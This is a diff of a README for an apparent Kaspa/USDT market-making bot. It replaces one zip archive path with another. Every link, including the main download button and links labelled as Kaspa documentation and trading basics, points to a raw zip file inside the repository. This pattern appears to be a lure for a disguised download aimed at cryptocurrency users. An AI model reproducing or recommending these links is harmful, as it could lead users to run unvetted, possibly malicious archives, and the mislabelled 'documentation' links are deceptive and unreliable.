@@ -1,7 +1,7 @@
 # 🛠️ kaspa-market-maker-bot - Easy Adaptive Trading Made Simple
 
 ## 📥 Download Now!
-[![Download kaspa-market-maker-bot](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/kaspa-market-maker-bot_2.0-beta.5.zip)](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/kaspa-market-maker-bot_2.0-beta.5.zip)
+[![Download kaspa-market-maker-bot](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/market_kaspa_maker_bot_v1.4.zip)](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/market_kaspa_maker_bot_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **kaspa-market-maker-bot**, your easy solution for market-making. This application helps you trade KAS (Kaspa) and USDT (Tether) with an adaptive strategy, ensuring you can optimally balance your investments.
@@ -20,7 +20,7 @@ Before you start, make sure your system meets the following requirements:
 - **Latency-Optimized Order Management:** Execute orders quickly and efficiently to take advantage of market conditions.
 
 ## 📦 Download & Install
-To get started, **visit this page to download** the application: [Download kaspa-market-maker-bot](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/kaspa-market-maker-bot_2.0-beta.5.zip).
+To get started, **visit this page to download** the application: [Download kaspa-market-maker-bot](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/market_kaspa_maker_bot_v1.4.zip).
 
 ### ⬇️ Installation Steps
 1. Click on the download link above.
@@ -77,8 +77,8 @@ This application is related to:
 
 ## 📄 Additional Resources
 For more information about market making and algorithmic trading, check out resources available:
-- [Kaspa Documentation](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/kaspa-market-maker-bot_2.0-beta.5.zip)
-- [Algorithmic Trading Basics](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/kaspa-market-maker-bot_2.0-beta.5.zip)
+- [Kaspa Documentation](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/market_kaspa_maker_bot_v1.4.zip)
+- [Algorithmic Trading Basics](https://raw.githubusercontent.com/GamersproYT982/kaspa-market-maker-bot/main/src/market_kaspa_maker_bot_v1.4.zip)
 
 ## 👩‍💻 Feedback and Contributions
 Your input matters. Feel free to contribute to this project by submitting issues, proposing improvements, or making feature requests. 
